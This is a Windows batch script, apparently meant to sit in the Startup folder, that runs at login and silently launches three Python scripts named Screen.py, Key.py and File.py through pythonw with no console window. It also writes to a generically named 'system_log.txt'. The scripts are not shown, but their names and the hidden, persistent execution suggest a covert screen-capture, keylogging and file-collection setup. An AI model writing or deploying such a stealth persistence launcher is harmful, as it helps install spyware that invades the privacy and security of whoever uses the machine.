@echo off
setlocal

:: Ensure we are running from the Startup folder
cd /d "%~dp0"

:: Optional: Log file for troubleshooting
set LOGFILE=%~dp0system_log.txt
echo ===== System Start %DATE% %TIME% ===== >> "%LOGFILE%"

:: Check if pythonw exists
where pythonw >nul 2>&1
if %errorlevel% neq 0 (
    echo pythonw not found! >> "%LOGFILE%"
    exit /b
)

:: Run scripts silently (no console window)
start "" pythonw "%~dp0Screen.py"
timeout /t 2 >nul

start "" pythonw "%~dp0Key.py"
timeout /t 2 >nul

start "" pythonw "%~dp0File.py"

echo Scripts launched successfully >> "%LOGFILE%"

exit